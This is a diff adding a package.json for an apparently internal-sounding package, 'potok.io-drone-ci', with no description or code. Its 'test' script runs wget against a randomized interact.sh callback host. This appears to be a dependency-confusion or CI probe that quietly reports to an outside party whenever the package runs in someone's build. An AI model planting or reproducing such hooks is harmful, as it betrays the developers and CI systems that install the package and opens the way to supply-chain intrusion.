@@ -1,0 +1,19 @@
+{
+  "name": "potok.io-drone-ci",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "test": "wget https://c7kmktf2vtc0000xwahggd34j7ryyyyyb.interact.sh"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/curios-monkey/drone-ci.git"
+  },
+  "author": "",
+  "license": "ISC",
+  "bugs": {
+    "url": "https://github.com/curios-monkey/drone-ci/issues"
+  },
+  "homepage": "https://github.com/curios-monkey/drone-ci#readme"
+}
